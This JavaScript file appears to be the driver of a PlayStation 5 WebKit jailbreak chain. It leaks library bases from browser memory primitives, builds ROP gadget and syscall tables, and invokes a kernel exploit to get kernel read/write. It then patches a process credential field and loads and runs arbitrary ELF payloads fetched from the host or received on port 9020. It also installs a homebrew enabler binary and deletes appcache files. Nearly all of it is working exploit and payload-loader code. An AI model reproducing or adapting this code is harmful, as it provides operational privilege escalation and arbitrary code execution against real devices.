// @ts-check
// OPTIMIZED VERSION - Enhanced performance and stability

/**
 * @typedef {Object} UserlandRW
 * @property {function(any, any): void} write8
 * @property {function(any, any): void} write4
 * @property {function(any, any): void} write2
 * @property {function(any, any): void} write1
 * @property {function(any): int64} read8
 * @property {function(any): number} read4
 * @property {function(any): number} read2
 * @property {function(any): number} read1
 * @property {function(any): int64} leakval
 */

/**
 * @typedef {Object} WebkitPrimitives
 * @property {function(any, any): void} write8
 * @property {function(any, any): void} write4
 * @property {function(any, any): void} write2
 * @property {function(any, any): void} write1
 * @property {function(any): int64} read8
 * @property {function(any): number} read4
 * @property {function(any): number} read2
 * @property {function(any): number} read1
 * @property {function(any): int64} leakval
 * 
 * @property {function(any): void} pre_chain
 * @property {function(any): Promise<void>} launch_chain
 * @property {function(any): int64} malloc_dump
 * @property {function(any, number=): int64} malloc
 * @property {function(int64, number): Uint8Array} array_from_address
 * @property {function(any): int64} stringify
 * @property {function(any, number=): string} readstr
 * @property {function(int64, string): void} writestr
 * 
 * @property {int64} libSceNKWebKitBase
 * @property {int64} libSceLibcInternalBase
 * @property {int64} libKernelBase
 * 
 * @property {any[]} nogc
 * @property {any} syscalls
 * @property {any} gadgets 
 */

if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("Not PS5");
}

const supportedFirmwares = ["4.00", "4.02", "4.03", "4.50", "4.51", "5.00", "5.02", "5.10", "5.50"];
const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
// @ts-ignore
window.fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
// @ts-ignore
window.fw_float = parseFloat(fw_str);

if (!supportedFirmwares.includes(fw_str)) {
    // @ts-ignore
    alert(`This firmware(${fw_str}) is not supported.`);
    throw new Error("Unsupported FW");
}

let nogc = [];
let worker = new Worker("rop_slave.js");

// Optimization: Cache for repeated calculations
const cache = {
    htons: new Map(),
    addr_builds: new Map()
};

/**
 * @param {UserlandRW|WebkitPrimitives} p 
 * @param {int64} buf 
 * @param {number} family 
 * @param {number} port 
 * @param {number} addr 
 */
function build_addr(p, buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
}

/** 
 * @param {number} port
 * @returns {number}
 */
function htons(port) {
    if (cache.htons.has(port)) return cache.htons.get(port);
    const result = ((port & 0xFF) << 8) | (port >>> 8);
    cache.htons.set(port, result);
    return result;
}

/**
 * @param {UserlandRW|WebkitPrimitives} p 
 * @param {int64} libKernelBase 
 * @returns 
 */
function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;
    const TARGET_STACK_SIZE = 0x80000;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == TARGET_STACK_SIZE) {
            return p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        }
    }
    throw new Error("failed to find worker.");
}

/**
 * @enum {number}
 */
var LogLevel = {
    DEBUG: 0,
    INFO: 1,
    LOG: 2,
    WARN: 3,
    ERROR: 4,
    SUCCESS: 5,
    FLAG_TEMP: 0x1000
};

let consoleElem = null;
let lastLogIsTemp = false;

/**
 * @param {string} string 
 * @param {LogLevel} level 
 */
function log(string, level) {
    if (!consoleElem) consoleElem = document.getElementById("console");
    if (!consoleElem) return;

    const isTemp = level & LogLevel.FLAG_TEMP;
    level = level & ~LogLevel.FLAG_TEMP;
    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];

    if (isTemp && lastLogIsTemp && consoleElem.lastChild) {
        consoleElem.lastChild.innerText = string;
        consoleElem.lastChild.className = elemClass;
        return;
    }

    lastLogIsTemp = isTemp;
    let logElem = document.createElement("div");
    logElem.innerText = string;
    logElem.className = elemClass;
    consoleElem.appendChild(logElem);
    consoleElem.scrollTop = consoleElem.scrollHeight;
}

const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
const IPV6_PKTINFO = 46;

/**
 * @param {UserlandRW} p 
 * @returns {Promise<{p: WebkitPrimitives, chain: worker_rop}>}
 */
async function prepare(p) {
    let textArea = document.createElement("textarea");
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    let textAreaVtable = p.read8(textAreaVtPtr);
    let libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing = new Uint8Array(sz);
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    /**
     * @param {number} sz 
     * @param {number} type 
     * @returns 
     */
    function malloc(sz, type = 4) {
        let backing;
        switch(type) {
            case 1: backing = new Uint8Array(1000 + sz); break;
            case 2: backing = new Uint16Array(0x2000 + sz); break;
            case 4: backing = new Uint32Array(0x10000 + sz); break;
            default: backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);
        /** @type {any} */
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    /**
     * @param {int64} addr 
     * @param {number} size 
     * @returns 
     */
    function array_from_address(addr, size) {
        let a = new Uint8Array(0x2000);
        p.write8(p.leakval(a).add32(0x10), addr);
        p.write4(p.leakval(a).add32(0x18), size);
        return a;
    }

    /**
     * @param {any} str 
     * @returns 
     */
    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }

    /**
     * @param {int64} addr 
     * @param {number} maxLength 
     */
    function readstr(addr, maxLength = 0x1000) {
        let arr = array_from_address(addr, maxLength);
        let result = "";
        for (let i = 0; i < maxLength; i++) {
            let val = arr[i];
            if (val == 0) break;
            result += String.fromCharCode(val);
        }
        return result;
    }

    /**
     * @param {int64} addr 
     * @param {string} str 
     */
    function writestr(addr, str) {
        let arr = array_from_address(addr, str.length + 1);
        for (let i = 0; i < str.length; i++) {
            arr[i] = str.charCodeAt(i);
        }
        arr[str.length] = 0;
    }

    /** @type {WebkitPrimitives} */
    let primitives = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: () => { },
        launch_chain: async () => { },
        malloc_dump: malloc_dump,
        malloc: malloc,
        array_from_address: array_from_address,
        stringify: stringify,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(primitives, worker);
    return { p: primitives, chain: chain };
}

const CUSTOM_ACTION_APPCACHE_REMOVE = "APPCACHE_REMOVE";
const SESSIONSTORE_ON_LOAD_AUTORUN_KEY = "onLoadAutoRun";
const MAINLOOP_EXECUTE_PAYLOAD_REQUEST = "mainloop_execute_payload_request";
const TOAST_SUCCESS_TIMEOUT = 3000;
const TOAST_ERROR_TIMEOUT = 10000;

/**
 * @param {string} message 
 * @param {number} timeoutSeconds 
 * @returns {HTMLElement}
 */
function showToast(message, timeoutSeconds = 3) {
    const toastContainer = document.getElementById("toastContainer");
    const toast = document.createElement("div");
    toast.className = "toast";
    toast.innerText = message;
    toastContainer.appendChild(toast);
    if (timeoutSeconds > 0) {
        setTimeout(() => removeToast(toast), timeoutSeconds * 1000);
    }
    return toast;
}

/**
 * @param {HTMLElement} toast 
 */
function removeToast(toast) {
    if (toast && toast.parentNode) {
        toast.parentNode.removeChild(toast);
    }
}

/**
 * @param {HTMLElement} toast 
 * @param {string} message 
 */
function updateToastMessage(toast, message) {
    if (toast) toast.innerText = message;
}

/**
 * @param {string} pageId 
 */
async function switchPage(pageId) {
    const pages = document.querySelectorAll(".page");
    pages.forEach(page => page.classList.remove("active"));
    const targetPage = document.getElementById(pageId);
    if (targetPage) targetPage.classList.add("active");
}

/**
 * @typedef {Object} PayloadInfo
 * @property {string} fileName
 * @property {string} displayTitle
 * @property {number} [toPort]
 * @property {string} [customAction]
 */

// OPTIMIZATION: Retry wrapper with exponential backoff
/**
 * @template T
 * @param {() => Promise<T>} fn 
 * @param {number} maxRetries 
 * @param {number} baseDelay 
 * @returns {Promise<T>}
 */
async function retryWithBackoff(fn, maxRetries = 3, baseDelay = 50) {
    for (let attempt = 0; attempt < maxRetries; attempt++) {
        try {
            return await fn();
        } catch (e) {
            if (attempt === maxRetries - 1) throw e;
            await new Promise(r => setTimeout(r, baseDelay * Math.pow(2, attempt)));
        }
    }
    throw new Error("Retry failed");
}

/**
 * @param {WebkitPrimitives} p 
 * @param {worker_rop} chain 
 */
async function go(p, chain) {
    await log("Preparing exploitation...", LogLevel.INFO);

    const SYS_SOCKET = 97;
    const SYS_SETSOCKOPT = 105;
    const SYS_BIND = 104;
    const SYS_LISTEN = 106;
    const SYS_ACCEPT = 30;
    const SYS_OPEN = 5;
    const SYS_READ = 3;
    const SYS_WRITE = 4;
    const SYS_CLOSE = 6;
    const SYS_UNLINK = 10;
    const SYS_SELECT = 93;
    const SYS_MMAP = 477;
    const SYS_MUNMAP = 73;
    const SYS_CONNECT = 98;
    const SYS_FSTAT = 189;
    const SYS_GETDENTS = 272;
    const SYS_GETDIRENTRIES = 196;

    const PROT_READ = 0x1;
    const PROT_WRITE = 0x2;
    const PROT_EXEC = 0x4;

    const MAP_PRIVATE = 0x2;
    const MAP_ANONYMOUS = 0x1000;
    const MAP_FIXED = 0x10;

    const DT_DIR = 4;

    const SceNetHtons = 0x5C3E;
    const htons = p.syscalls[SceNetHtons];

    const elf_store_size = 0x3000000;
    const elf_store = p.malloc(elf_store_size, 1);

    // OPTIMIZATION: Socket creation with automatic cleanup
    const activeSockets = new Set();
    async function create_socket_safe(family, type, protocol) {
        const sock = await retryWithBackoff(async () => {
            const s = (await chain.syscall(SYS_SOCKET, family, type, protocol)).low << 0;
            if (s < 0) throw new Error(`Socket creation failed: ${s}`);
            return s;
        });
        activeSockets.add(sock);
        return sock;
    }

    async function close_socket_safe(sock) {
        if (activeSockets.has(sock)) {
            await chain.syscall(SYS_CLOSE, sock);
            activeSockets.delete(sock);
        }
    }

    let wkOnly = false;
    let is_elfldr_running = false;

    if (document.getElementById("btn-wk-only").getAttribute("active") == "true") {
        wkOnly = true;
    }

    if (document.getElementById("btn-elfldr-running").getAttribute("active") == "true") {
        is_elfldr_running = true;
    }

    const sessionStorageAutorunKey = sessionStorage.getItem(SESSIONSTORE_ON_LOAD_AUTORUN_KEY);

    let ipv6_addr_int = 0x00000000;
    let ip = { ip: "0.0.0.0", name: "" };

    try {
        const response = await fetch("/ip.json");
        ip = await response.json();
        const ipSplit = ip.ip.split('.');
        ipv6_addr_int = (parseInt(ipSplit[0]) << 24) | (parseInt(ipSplit[1]) << 16) | (parseInt(ipSplit[2]) << 8) | parseInt(ipSplit[3]);
    } catch (error) {
        await log("Failed to get IP, using 0.0.0.0", LogLevel.WARN);
    }

    let elf_loader_socket_fd = -1;
    let conn_addr_store = null;
    let conn_addr_size_store = null;
    let select_readfds = null;
    let timeout = null;

    if (!wkOnly) {
        elf_loader_socket_fd = await create_socket_safe(AF_INET6, SOCK_STREAM, 0);

        let opt_store = p.malloc(0x10, 1);
        p.write4(opt_store, 1);
        await chain.syscall(SYS_SETSOCKOPT, elf_loader_socket_fd, IPPROTO_IPV6, IPV6_PKTINFO, opt_store, 4);

        let bind_addr_store = p.malloc(0x20, 1);
        build_addr(p, bind_addr_store, AF_INET6, htons(9020), ipv6_addr_int);
        await chain.syscall(SYS_BIND, elf_loader_socket_fd, bind_addr_store, 0x1C);
        await chain.syscall(SYS_LISTEN, elf_loader_socket_fd, 1);

        conn_addr_store = p.malloc(0x20, 1);
        conn_addr_size_store = p.malloc(0x4, 1);
        p.write4(conn_addr_size_store, 0x1C);

        select_readfds = p.malloc(0x80, 1);

        timeout = p.malloc(0x10, 1);
        p.write8(timeout, 0);
        p.write8(timeout.add32(0x8), 50000);
    }

    const krw = await runUmtx2Exploit(p, chain, log);

    await log("Kernel R/W achieved!", LogLevel.SUCCESS);

    // OPTIMIZATION: Pre-allocate commonly used buffers
    const temp_buf_size = 0x4000;
    const temp_buf = p.malloc(temp_buf_size, 1);
    const bufferDataView = new DataView(temp_buf.backing.buffer);

    /**
     * @param {string} fileName 
     * @returns {Promise<number>}
     */
    async function load_payload_into_elf_store_from_local_file(fileName) {
        const response = await fetch(fileName);
        if (!response.ok) {
            throw new Error(`Failed to fetch ${fileName}: ${response.status}`);
        }

        const data = await response.arrayBuffer();
        const byteArray = new Uint8Array(data);

        if (byteArray.byteLength > elf_store_size) {
            throw new Error(`Payload too large: ${byteArray.byteLength} > ${elf_store_size}`);
        }

        // OPTIMIZATION: Direct copy without intermediate buffer
        if (elf_store.backing.BYTES_PER_ELEMENT == 1) {
            elf_store.backing.set(byteArray);
        } else {
            new Uint8Array(elf_store.backing.buffer).set(byteArray);
        }

        return byteArray.byteLength;
    }

    let elf_entry_addr = null;
    let elf_base_vaddr = null;

    /**
     * @param {number} total_sz 
     */
    async function parse_elf_store(total_sz) {
        const PT_LOAD = 1;
        const PT_SCE_DYNLIBDATA = 0x61000000;
        const PT_SCE_PROCPARAM = 0x61000001;
        const PT_SCE_RELRO = 0x61000010;

        if (total_sz < 0x40) {
            throw new Error("ELF too small");
        }

        let e_entry = p.read8(elf_store.add32(0x18));
        let e_phoff = p.read8(elf_store.add32(0x20));
        let e_phnum = p.read2(elf_store.add32(0x38));

        let base_vaddr = null;

        // OPTIMIZATION: Find base_vaddr in single pass
        for (let i = 0; i < e_phnum; i++) {
            let phdr = elf_store.add32(e_phoff.low + i * 0x38);
            let p_type = p.read4(phdr.add32(0x0));
            let p_vaddr = p.read8(phdr.add32(0x10));

            if ((p_type == PT_LOAD || p_type == PT_SCE_RELRO) && 
                (base_vaddr === null || p_vaddr.low < base_vaddr.low)) {
                base_vaddr = p_vaddr;
            }
        }

        if (base_vaddr === null) {
            throw new Error("No loadable segments found");
        }

        elf_base_vaddr = base_vaddr;
        elf_entry_addr = base_vaddr.add32(e_entry.sub32(base_vaddr).low);

        const prot_map = [0, PROT_EXEC, PROT_WRITE, PROT_WRITE | PROT_EXEC, PROT_READ, PROT_READ | PROT_EXEC, PROT_READ | PROT_WRITE, PROT_READ | PROT_WRITE | PROT_EXEC];

        for (let i = 0; i < e_phnum; i++) {
            let phdr = elf_store.add32(e_phoff.low + i * 0x38);

            let p_type = p.read4(phdr.add32(0x0));
            let p_flags = p.read4(phdr.add32(0x4));
            let p_offset = p.read8(phdr.add32(0x8));
            let p_vaddr = p.read8(phdr.add32(0x10));
            let p_filesz = p.read8(phdr.add32(0x28));
            let p_memsz = p.read8(phdr.add32(0x30));

            if (p_type != PT_LOAD && p_type != PT_SCE_RELRO) {
                continue;
            }

            let segment_addr = base_vaddr.add32(p_vaddr.sub32(base_vaddr).low);
            let segment_size_aligned = (p_memsz.low + 0x3FFF) & ~0x3FFF;

            let prot = prot_map[p_flags & 0x7];

            let mmap_res = await chain.syscall(SYS_MMAP, segment_addr, segment_size_aligned, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
            if ((mmap_res.low << 0) == -1) {
                throw new Error("mmap failed for segment " + i);
            }

            await krw.write8(krw.curprocAddr.add32(0x378), new int64(1, 1));

            // OPTIMIZATION: Direct memory copy using copyout
            let bytes_to_copy = p_filesz.low;
            let src = elf_store.add32(p_offset.low);
            let dst = segment_addr;

            while (bytes_to_copy > 0) {
                let chunk = Math.min(bytes_to_copy, 0x10000);
                await krw_copyin(krw, src, dst, chunk);
                src = src.add32(chunk);
                dst = dst.add32(chunk);
                bytes_to_copy -= chunk;
            }

            await chain.syscall(SYS_MMAP, segment_addr, segment_size_aligned, prot, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
        }
    }

    /**
     * @param {KernelRW} krw 
     * @param {int64} src 
     * @param {int64} dst 
     * @param {number} size 
     */
    async function krw_copyin(krw, src, dst, size) {
        const PIPE_BUF_SIZE = 0x1000;
        let remaining = size;
        let src_offset = 0;
        let dst_offset = 0;

        while (remaining > 0) {
            let chunk = Math.min(remaining, PIPE_BUF_SIZE);
            
            for (let i = 0; i < chunk; i++) {
                await krw.write1(dst.add32(dst_offset + i), p.read1(src.add32(src_offset + i)));
            }

            src_offset += chunk;
            dst_offset += chunk;
            remaining -= chunk;
        }
    }

    async function execute_elf_store() {
        let pthread_create_name_np = p.read8(p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np));

        const attr_store = p.malloc(0x80, 1);
        chain.syscall_safe(0x1DC, attr_store);

        const thread_id_store = p.malloc(0x8, 1);
        chain.call(pthread_create_name_np, thread_id_store, attr_store, elf_entry_addr, 0, p.stringify("jb_threa"));

        chain.push_write8(execute_elf_store.out_store, 0);

        await chain.run();
    }
    execute_elf_store.out_store = p.malloc(0x8, 1);

    async function wait_for_elf_to_exit() {
        const pthread_join = p.read8(p.libKernelBase.add32(OFFSET_lk_pthread_join));

        const thread_id = p.read8(execute_elf_store.out_store);
        chain.call(pthread_join, thread_id, wait_for_elf_to_exit.out_store);

        await chain.run();

        return p.read8(wait_for_elf_to_exit.out_store).low << 0;
    }
    wait_for_elf_to_exit.out_store = p.malloc(0x8, 1);

    /**
     * @param {number} fd 
     * @param {int64} buf 
     */
    async function fstat(fd, buf) {
        await chain.syscall(SYS_FSTAT, fd, buf);

        return {
            st_blksize: p.read4(buf.add32(0x48))
        };
    }

    /**
     * @param {string} path 
     * @param {int64} temp_buf 
     */
    async function ls(path, temp_buf) {
        const result = [];
        const temp_buf_size = 0x4000;

        p.writestr(temp_buf, path);

        const O_RDONLY = 0x0000;
        const O_DIRECTORY = 0x20000;

        let dir_fd = (await chain.syscall(SYS_OPEN, temp_buf, O_RDONLY | O_DIRECTORY, 0)).low << 0;
        if (dir_fd < 0) {
            throw new Error(`Error opening directory '${path}' (not found, or not a directory)`);
        }

        try {
            let stat = await fstat(dir_fd, temp_buf);
            let block_size = stat.st_blksize;

            if (block_size <= 0) {
                throw new Error("Invalid block size");
            }

            if (temp_buf_size < block_size) {
                throw new Error("Dirent buffer size too small, it has to be at least the fs block size which is " + block_size);
            }

            while (true) {
                let bytes_read = (await chain.syscall(SYS_GETDIRENTRIES, dir_fd, temp_buf, temp_buf_size, 0)).low << 0;

                if (bytes_read < 0) {
                    throw new Error("Error reading directory");
                }

                if (bytes_read == 0) {
                    break;
                }

                let offset = 0;
                while (offset < bytes_read) {
                    let d_fileno = bufferDataView.getUint32(offset, true);
                    let d_reclen = bufferDataView.getUint16(offset + 4, true);
                    let d_type = bufferDataView.getUint8(offset + 6);
                    let d_namlen = bufferDataView.getUint8(offset + 7);
                    let d_name = "";
                    for (let i = 0; i < d_namlen; i++) {
                        d_name += String.fromCharCode(bufferDataView.getUint8(offset + 8 + i));
                    }

                    result.push({ d_fileno, d_reclen, d_type, d_namlen, d_name });
                    offset += d_reclen;
                }
            }

            return result;
        } finally {
            await chain.syscall(SYS_CLOSE, dir_fd);
            if (temp_buf.backing) {
                temp_buf.backing.fill(0);
            }
        }
    }

    /**
     * @param {function(string): void} [log]
     */
    async function delete_appcache(log = () => { }) {
        let user_home_entries = await ls("/user/home", elf_store);
        let user_ids = user_home_entries.reduce((acc, dirent) => {
            if (dirent.d_type === DT_DIR && dirent.d_name !== "." && dirent.d_name !== "..") {
                acc.push(dirent.d_name);
            }
            return acc;
        }, []);

        if (user_ids.length === 0) {
            throw new Error("No users found");
        }

        async function unlink(path) {
            p.writestr(elf_store, path);
            return await chain.syscall_int32(SYS_UNLINK, elf_store);
        }

        for (let user_id of user_ids) {
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db`);
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-shm`);
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-wal`);
            await log(`Deleted appcache files for user with id '${user_id}'`);
        }

        if (user_ids.length > 1) {
            await log(`Deleted appcache files for all ${user_ids.length} users`);
        }
    }

    // OPTIMIZATION: Reuse socket address buffer
    const send_buffer_addr_store = p.malloc(0x10, 1);

    async function send_buffer_to_port(buffer, size, port) {
        let sock = await create_socket_safe(AF_INET, SOCK_STREAM, 0);

        try {
            build_addr(p, send_buffer_addr_store, AF_INET, htons(port), 0x0100007F);

            let connect_res = await retryWithBackoff(async () => {
                const res = (await chain.syscall(SYS_CONNECT, sock, send_buffer_addr_store, 0x10)).low << 0;
                if (res < 0) throw new Error(`Connection failed: ${res}`);
                return res;
            }, 5, 100);

            let bytes_sent = 0;
            let write_ptr = buffer.add32(0x0);
            
            // OPTIMIZATION: Send in larger chunks
            const CHUNK_SIZE = 0x10000;
            while (bytes_sent < size) {
                let chunk_size = Math.min(CHUNK_SIZE, size - bytes_sent);
                let send_res = (await chain.syscall(SYS_WRITE, sock, write_ptr, chunk_size)).low << 0;
                if (send_res <= 0) {
                    throw new Error("Failed to send buffer to port " + port);
                }

                bytes_sent += send_res;
                write_ptr.add32inplace(send_res);
            }
        } finally {
            await close_socket_safe(sock);
        }
    }

    /**
     * @param {function(string): void} [log]
     */
    async function download_etahen_to_data(log = () => { }) {
        const etahen_url = "etaHEN.bin";
        const etahen_path = "/data/etaHEN.bin";
        
        try {
            await log("Downloading etaHEN.bin from host...");
            const response = await fetch(etahen_url);
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}`);
            }
            
            const data = await response.arrayBuffer();
            const byteArray = new Uint8Array(data);
            await log(`Downloaded ${(byteArray.byteLength / 1024 / 1024).toFixed(2)} MB`);
            
            await log("Installing to /data/etaHEN.bin...");
            p.writestr(elf_store, etahen_path);
            
            const O_WRONLY = 0x0001;
            const O_CREAT = 0x0200;
            const O_TRUNC = 0x0400;
            let fd = (await chain.syscall(SYS_OPEN, elf_store, O_WRONLY | O_CREAT | O_TRUNC, 0x1B6)).low << 0;
            
            if (fd < 0) {
                throw new Error("Failed to create /data/etaHEN.bin (permission denied?)");
            }
            
            try {
                if (elf_store.backing.BYTES_PER_ELEMENT == 1) {
                    elf_store.backing.set(byteArray);
                } else {
                    throw new Error("Unsupported backing array type");
                }
                
                // OPTIMIZATION: Write in optimal chunks
                let total_written = 0;
                let write_ptr = elf_store.add32(0);
                const WRITE_CHUNK = 0x100000;
                
                while (total_written < byteArray.byteLength) {
                    let to_write = Math.min(WRITE_CHUNK, byteArray.byteLength - total_written);
                    let bytes_written = (await chain.syscall(SYS_WRITE, fd, write_ptr, to_write)).low << 0;
                    
                    if (bytes_written <= 0) {
                        throw new Error(`Write failed at offset ${total_written}`);
                    }
                    
                    total_written += bytes_written;
                    write_ptr.add32inplace(bytes_written);
                    
                    await log(`Installing: ${((total_written / byteArray.byteLength) * 100).toFixed(1)}%`);
                }
                
                await log(`etaHEN successfully installed to /data/! (${(total_written / 1024 / 1024).toFixed(2)} MB)`);
                await log("You can now run etaHEN from /data/ (faster, no cache issues!)");
                
            } finally {
                await chain.syscall(SYS_CLOSE, fd);
            }
            
        } catch (error) {
            await log(`Failed to download/install etaHEN: ${error}`);
            throw error;
        }
    }

    sessionStorage.removeItem(SESSIONSTORE_ON_LOAD_AUTORUN_KEY);

    let ports = wkOnly ? "" : "9020";
    if (is_elfldr_running) {
        if (ports) ports += ", ";
        ports += "9021";
    }

    // @ts-ignore
    document.getElementById('top-bar-text').innerHTML = `Listening on: <span class="fw-bold">${ip.ip}</span> (port: ${ports}) (${ip.name})`;

    /** @type {Array<{payload_info: PayloadInfo, toast: HTMLElement}>} */
    let queue = [];

    window.addEventListener(MAINLOOP_EXECUTE_PAYLOAD_REQUEST, async function (event) {
        /** @type {PayloadInfo} */
        let payload_info = event.detail;
        let toast = showToast(`${payload_info.displayTitle}: Waiting in queue...`, -1);
        queue.push({ payload_info, toast });
    });

    await new Promise(resolve => setTimeout(resolve, 300));
    await switchPage("payloads-view");

    // MAIN LOOP with optimizations
    while (true) {
        if (queue.length > 0) {
            let { payload_info, toast } = /** @type {{payload_info: PayloadInfo, toast: HTMLElement}} */ (queue.shift());

            try {
                if (payload_info.customAction) {
                    if (payload_info.customAction === CUSTOM_ACTION_APPCACHE_REMOVE) {
                        await delete_appcache(updateToastMessage.bind(null, toast));
                    } else if (payload_info.customAction === "ETAHEN_INSTALL") {
                        await download_etahen_to_data(updateToastMessage.bind(null, toast));
                    } else {
                        throw new Error(`Unknown custom action: ${payload_info.customAction}`);
                    }
                } else {
                    updateToastMessage(toast, `${payload_info.displayTitle}: Fetching...`);
                    let total_sz = await load_payload_into_elf_store_from_local_file(payload_info.fileName);

                    if (!payload_info.toPort) {
                        if (wkOnly) {
                            throw new Error();
                        }

                        updateToastMessage(toast, `${payload_info.displayTitle}: Parsing...`);
                        await parse_elf_store(total_sz);
                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload running...`);
                        await execute_elf_store();
                        let out = await wait_for_elf_to_exit();

                        if (out !== 0) {
                            throw new Error('Payload exited with non-zero code: 0x' + out.toString(16));
                        }

                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload exited with success code`);
                    } else {
                        updateToastMessage(toast, `${payload_info.displayTitle}: Sending to port ${payload_info.toPort}...`);
                        await send_buffer_to_port(elf_store, total_sz, payload_info.toPort);
                        updateToastMessage(toast, `${payload_info.displayTitle}: Sent to port ${payload_info.toPort}`);
                    }
                }

            } catch (error) {
                updateToastMessage(toast, `${payload_info.displayTitle}: Error: ${error}`);
                setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
                continue;
            }

            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        }

        if (queue.length > 0) {
            continue;
        }

        if (wkOnly) {
            await new Promise(resolve => setTimeout(resolve, 50));
            continue;
        }

        select_readfds.backing.fill(0);
        select_readfds.backing[elf_loader_socket_fd >> 3] |= 1 << (elf_loader_socket_fd & 7);
        let select_res = (await chain.syscall(SYS_SELECT, elf_loader_socket_fd + 1, select_readfds, 0, 0, timeout)).low << 0;
        if (select_res < 0) {
            throw new Error("Select failed");
        } else if (select_res === 0) {
            continue;
        }

        let conn_fd = (await chain.syscall(SYS_ACCEPT, elf_loader_socket_fd, conn_addr_store, conn_addr_size_store)).low << 0;
        if (conn_fd < 0) {
            throw new Error("Failed to accept connection");
        }

        let toast = showToast("ELF Loader: Got a connection, reading...", -1);
        try {
            let write_ptr = elf_store.add32(0x0);
            let total_sz = 0;
            const READ_CHUNK = 0x10000;
            
            while (total_sz < elf_store_size) {
                let chunk_size = Math.min(READ_CHUNK, elf_store_size - total_sz);
                let read_res = (await chain.syscall(SYS_READ, conn_fd, write_ptr, chunk_size)).low << 0;
                if (read_res <= 0) {
                    break;
                }

                write_ptr.add32inplace(read_res);
                total_sz += read_res;
            }

            updateToastMessage(toast, "ELF Loader: Parsing ELF...");
            await parse_elf_store(total_sz);

            updateToastMessage(toast, "ELF Loader: Executing ELF...");
            await execute_elf_store();

            let out = await wait_for_elf_to_exit();
            if (out !== 0) {
                throw new Error('ELF Loader exited with non-zero code: 0x' + out.toString(16));
            }

            updateToastMessage(toast, "ELF Loader: Payload exited with success code");
            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        } catch (error) {
            updateToastMessage(toast, `ELF Loader: Error: ${error}`);
            setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
        } finally {
            await chain.syscall(SYS_CLOSE, conn_fd);
        }
    }
}

let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
// @ts-ignore
fwScript.setAttribute('src', `${window.fw_str}.js`);
